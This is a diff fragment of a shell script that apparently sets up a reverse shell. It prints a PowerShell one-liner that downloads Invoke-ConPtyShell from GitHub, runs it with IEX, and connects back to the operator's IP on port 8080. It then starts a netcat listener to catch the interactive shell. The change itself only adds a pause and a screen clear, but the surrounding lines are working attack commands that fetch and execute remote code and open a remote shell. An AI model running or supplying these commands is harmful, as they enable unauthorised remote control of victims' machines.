@@ -19,4 +19,6 @@ sleep 0.1
 echo "1..."
 sleep 1
 echo "${blue} IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell $ipadress 8080"
+sleep 10
+clear
 stty raw -echo; (stty size; cat) | nc -lvnp 8080 
